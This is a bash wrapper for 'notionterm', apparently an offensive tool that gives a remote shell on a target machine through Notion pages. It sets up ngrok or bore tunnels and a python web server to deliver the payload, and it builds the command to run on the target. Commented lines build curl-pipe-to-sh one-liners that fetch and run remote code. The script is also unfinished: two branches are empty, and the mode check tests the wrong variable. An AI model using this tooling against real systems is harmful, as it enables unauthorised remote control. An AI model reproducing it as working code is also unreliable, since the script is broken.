#!/usr/bin/env bash

## Wrap it: tmux new-session -s notionterm 'wrap-notionterm.sh'

## Simple wrapper, do not send static ngrok to remote

if [[ -z "${TMUX}" ]]; then
    echo "Must be run in tmux"
    exit 92
fi

TOKEN="$(gum input --password --placeholder="Enter notion token")"
PAGEID="$(gum input --placeholder="Enter notion page ID (CTRL+L)")"

IFS=$'\n'
IPS=$(ip -brief -j -c address | jq -r '.[] | select((.operstate=="UP") or (.operstate=="UNKNOWN")) | "\(.ifname): \(.addr_info[0].local)\n"')
IP_CHOICE=$(gum choose $IPS "tunnel: ngrok" "tunnel: bore")

# Webserver config
LPORT=$(gum input --placeholder "enter local port")
PORT=""
ENDPOINT=""

if [ "$IP_CHOICE" = "tunnel: ngrok" ]; then
    # launch ngrok, retrieve endpoint + port
    tmux split-window -v "ngrok tcp ${LPORT}"
    sleep 4 # wait for ngrok to start
    NGROK_ENDPOINT_TCP=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | jq -r ".tunnels[0].public_url")
    NGROK_ENDPOINT="$(echo $NGROK_ENDPOINT_TCP | cut -d ':' -f 2-3 | cut -d '/' -f 3-)"
    TUNNEL_ENDPOINT="${NGROK_ENDPOINT}"
    ENDPOINT="$(echo $TUNNEL_ENDPOINT | cut -d ':' -f 1)"
    PORT="$(echo $TUNNEL_ENDPOINT | cut -d ':' -f 2)"
elif [ "$IP_CHOICE" = "tunnel: bore" ]; then
    tmux split-window -v "bore local ${LPORT} --to bore.pub"
    PORT=$(gum input --placeholder "enter bore.pub remote_port given")
    ENDPOINT="bore.pub"
else
    ENDPOINT=$(echo $IP_CHOICE | cut -d ":" -f 2 | cut -d " " -f 2)
    PORT=$LPORT
fi

tmux split-window -h "python -m http.server ${LPORT}"

# Notionterm on target
REMOTE_CMD=""
MODE="$(gum choose "target → notion" "any page" "normal")"

if [ "$IP_CHOICE" = "target → notion" ]; then
    REMOTE_CMD="./notionterm light -u ${PAGEID} -t ${TOKEN}"
elif [ "$IP_CHOICE" = "any page" ]; then
    
else
    
fi

## with shorter shortcut?
## Gum choose
# if [[ "$SHORTCUT" ]]; then
#     ## Write file for gitar
#     echo "${REMOTE_CMD}" > sh
#     SHORTCUT_URL="${URL}/pull/sh"
#     REMOTE_CMD="\nsh -c \"\$(curl ${SHORTCUT_URL})\"\nsh <(curl ${SHORTCUT_URL})\ncurl ${SHORTCUT_URL}|sh\n"
#     # curl ${SHORTCUT_URL} |sh\n work but trigger error (/pkg/tacos/tacos.go:94)
#     # sh <() only work in zsh & bash
# fi